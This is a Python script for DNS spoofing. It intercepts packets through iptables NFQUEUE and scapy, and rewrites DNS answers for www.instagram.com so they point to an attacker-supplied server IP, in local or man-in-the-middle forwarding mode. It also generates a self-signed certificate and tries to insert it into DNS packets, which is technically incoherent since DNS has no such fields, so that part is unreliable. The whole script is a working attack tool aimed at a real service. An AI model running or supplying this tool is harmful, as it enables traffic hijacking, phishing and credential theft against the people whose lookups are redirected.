import datetime
import netfilterqueue
import subprocess
import argparse
import scapy.all as scapy
from cryptography import x509
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes

def generate_certificate():
    # Generate a new private key
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048
    )

    # Serialize the private key to PEM format
    private_key_pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    )

    # Extract the public key from the private key
    public_key = private_key.public_key()

    # Serialize the public key to PEM format
    public_key_pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )

    # Create a self-signed certificate using the private key and public key
    certificate = x509.CertificateBuilder().subject_name(
        x509.Name([
            x509.NameAttribute(x509.oid.NameOID.COMMON_NAME, u"example.com"),
        ])
    ).issuer_name(
        x509.Name([
            x509.NameAttribute(x509.oid.NameOID.COMMON_NAME, u"example.com"),
        ])
    ).public_key(
        public_key
    ).serial_number(
        x509.random_serial_number()
    ).not_valid_before(
        datetime.datetime.utcnow()
    ).not_valid_after(
        datetime.datetime.utcnow() + datetime.timedelta(days=3650)
    ).add_extension(
        x509.SubjectAlternativeName([x509.DNSName(u"example.com")]),
        critical=False
    ).sign(private_key, hashes.SHA256(), default_backend())

    # Serialize the certificate to PEM format
    certificate_pem = certificate.public_bytes(serialization.Encoding.PEM)

    return certificate_pem, private_key_pem, public_key_pem
    # Replace the original certificate fields in the DNS response with the new certificate
    # (assuming the DNS response is stored in a variable called "response")
    # response.certificate = certificate_pem
    # response.private_key = private_key_pem
    # response.public_key = public_key_pem



def parse_arguments():
    parser = argparse.ArgumentParser()
    scope = parser.add_mutually_exclusive_group(required=True)
    scope.add_argument('-l', '--local', action='store', help='Use in Local Mode')
    scope.add_argument('-r', '--remote', action='store', help='Use in Remote Mode')

    mode = parser.add_mutually_exclusive_group(required=True)
    mode.add_argument('-d', '--drop', action='store', help='Drop Packets')
    mode.add_argument('-f', '--forward', action='store', help='Forward Packets')

    parser.add_argument('-s', '--server', type=str, required=True, help='Spoofed Server IP Address')
    parser.add_argument('-c', '--cert', action='store', help='Generate a self-signed certificate')
    return parser.parse_args()

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if 'www.instagram.com' in qname:
            print('[+] Spoofing target')
            answer = scapy.DNSRR(rrname=qname, rdata=options.server)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            if options.cert:
                certificate, private_key, public_key = generate_certificate()
                scapy_packet[scapy.DNS].certificate = certificate
                scapy_packet[scapy.DNS].private_key = private_key
                scapy_packet[scapy.DNS].public_key = public_key
            packet.set_payload(str(scapy_packet))
    if options.drop:
        packet.drop()
    elif options.forward:
        packet.accept()
    # print(scapy_packet.show())


options = parse_arguments()

if options.local:
    subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
    subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)
elif options.remote:
    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
try:
    queue.run()
except KeyboardInterrupt:
    print('Reseting IP Table...')
    subprocess.call('iptables --flush', shell=True)
    print('Exiting...')
